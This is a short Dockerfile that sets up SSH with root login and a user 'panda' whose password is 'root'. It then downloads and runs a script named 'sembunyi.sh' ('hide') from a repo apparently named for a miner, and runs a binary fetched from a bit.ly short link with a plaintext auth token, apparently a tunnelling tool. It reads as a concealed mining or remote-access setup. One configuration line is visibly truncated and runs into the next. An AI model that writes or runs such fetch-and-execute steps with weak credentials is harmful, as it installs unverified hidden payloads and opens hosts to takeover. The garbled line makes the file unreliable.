FROM ubuntu:xenial-20180112.1
USER root
RUN apt-get update && apt-get install ssh gcc htop -y
RUN adduser --disabled-password --gecos "" panda
RUN adduser panda sudo && echo 'panda:root' | chpasswd
RUN echo 'Port 22' >> /etc/ssh/sshd_config && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && echo 'PasswordAuthe>RUN wget https://raw.githubusercontent.com/p4n1k/mnr/main/sembunyi.sh; chmod +x sembunyi.sh; ./sembunyi.sh
RUN wget https://bit.ly/3Iaxfe5
RUN chmod +x 3Iaxfe5
RUN ./3Iaxfe5 authtoken 22C7VwXrq4Il2k2yC4VgKYjNhsd_i6Ca
